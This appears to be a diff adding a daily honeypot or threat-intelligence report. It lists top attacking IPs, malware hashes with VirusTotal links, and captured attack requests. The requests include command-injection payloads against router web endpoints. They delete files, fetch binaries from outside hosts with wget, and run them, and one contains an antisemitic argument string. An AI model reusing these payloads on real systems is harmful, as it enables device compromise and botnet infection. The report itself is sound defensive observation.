@@ -1,0 +1,50 @@
+Top 5 IPs for 2024-06-23 :
+
+43.134.61.120
+183.56.242.180
+103.192.198.225
+150.223.74.10
+62.16.41.71
+
+Malware Observed:
+
+
+File name : tftp://31.44.183.2/.i
+d5601202dff3017db238145ff21857415f663031aca9b3d534bec8991b12179a
+https://www.virustotal.com/gui/file/d5601202dff3017db238145ff21857415f663031aca9b3d534bec8991b12179a
+
+
+71ecfb7bbc015b2b192c05f726468b6f08fcc804c093c718b950e688cc414af5
+https://www.virustotal.com/gui/file/71ecfb7bbc015b2b192c05f726468b6f08fcc804c093c718b950e688cc414af5
+
+
+1db1583bb4154934d467dd1522a3c03fb776ca94e73250db0e0c978079e5a481
+https://www.virustotal.com/gui/file/1db1583bb4154934d467dd1522a3c03fb776ca94e73250db0e0c978079e5a481
+
+
+26e72314a3c85dcd726ce1119d35279cb252d296cbe95504addd948ad32da9cc
+https://www.virustotal.com/gui/file/26e72314a3c85dcd726ce1119d35279cb252d296cbe95504addd948ad32da9cc
+
+
+fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+https://www.virustotal.com/gui/file/fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+
+
+Commands/exploits observed:
+
+
+POST /goform/set_LimitClient_cfg HTTP/1.1
+Cookie: user=admin
+
+time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf *mpsl*;wget http://103.174.73.190/tajma.mpsl; chmod 777 tajma.mpsl; ./tajma.mpsl tajma.mpsl;rm -rf *mpsl*;
+
+
+
+GET /shell?cd+/tmp;rm+arm4+arm7;wget+http:/\\/92.249.48.34/arm7;chmod+777+arm7;./arm7+jews;wget+http:/\\/92.249.48.34/arm4;chmod+777+arm4;./arm4+jews HTTP/1.1
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: KrebsOnSecurity
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
